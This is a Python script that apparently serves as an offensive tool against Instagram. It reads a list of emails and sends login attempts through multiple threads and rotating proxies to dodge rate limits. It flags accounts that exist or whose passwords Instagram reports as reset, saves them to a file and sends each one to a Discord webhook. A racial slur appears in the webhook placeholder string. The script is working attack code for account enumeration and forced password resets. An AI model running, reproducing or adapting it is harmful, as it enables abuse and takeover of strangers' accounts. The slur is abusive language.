import requests
import random
import threading
import os
from time import time
from discordwebhook import Discord
class Reset:
    def __init__(self):
        self.threads = int(input('> Threads: '))
        self.done = 0
        with open('emails.txt', 'r') as f:
            self.amount = len(f.read().splitlines())
        self.good = 0
        self.bad = 0
        self.retries = 0
        self.update_title()
    def start(self, email):
        discord = Discord(url="slap ur webhook here dumb nigga")
        self.update_title()
        email = email.replace('\n', '')

        melena = {
            'accept': '/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com/',
            'cookie': 'ig_cb=1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        }

        
        cookie = requests.get('https://www.instagram.com/', headers = melena)
        csrf0 = cookie.cookies.get_dict()['csrftoken']
        session = requests.session()
        data = {
            'username': email,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time()}:brueta',
            'queryParams': '{}',
            'optIntoOneTap': False
        }
        login_headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/login/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.287',
            'x-csrftoken': csrf0,
            'x-instagram-ajax': '1',
            'x-requested-with': 'XMLHttpRequest'
        }
        try:
            reset = session.post('https://www.instagram.com/accounts/login/ajax/', headers=login_headers, data=data, proxies={'http': str(self.proxy), 'https': str(self.proxy)}, timeout=4)
            if "To secure your account, we've reset your password" in reset.text:
                self.done += 1
                self.good += 1
                print(email)
                with open('good_emails.txt', 'a+') as f:
                    f.write(email + '\n')
                discord.post(content=str(email))
            elif reset.json().get('user') == True or reset.json().get('user') == 'true':
                self.done += 1
                self.good += 1
                print(email)
                with open('good_emails.txt', 'a+') as f:
                    f.write(email + '\n')
                discord.post(content=str(email))
            elif 'Please wait a few minutes before you try again.' in reset.text or 'Try Again Later' in reset.text:
                self.done += 1
                self.retries += 1
                self.cycle_proxy()
                self.start(email)
            else:
                self.done += 1
                self.bad += 1
        except:
            self.retries += 1
            self.cycle_proxy()
            self.start(email)

    def update_title(self):
        os.system(f'title Done ' + str(self.done) + '/' + str(self.amount) + ' -- Good: ' + str(self.good) + ' -- Bad: ' + str(self.bad) + ' -- Retries: ' + str(self.retries) + ' -- Threads: ' + str(self.threads))
    def cycle_proxy(self):
        with open('proxies.txt', 'r') as f:
            self.proxy = random.choice(f.readlines()).replace('\n', '')
    def multi_thread(self):
        with open('emails.txt', 'r') as f:
            for email in f:
                email = email.replace('\n', '')
                attempting = True
                while attempting == True:
                    if threading.active_count() <= self.threads:
                        threading.Thread(target=self.start, args=(email,)).start()
                        attempting = False

if __name__ == '__main__':
    reset = Reset()
    reset.multi_thread()
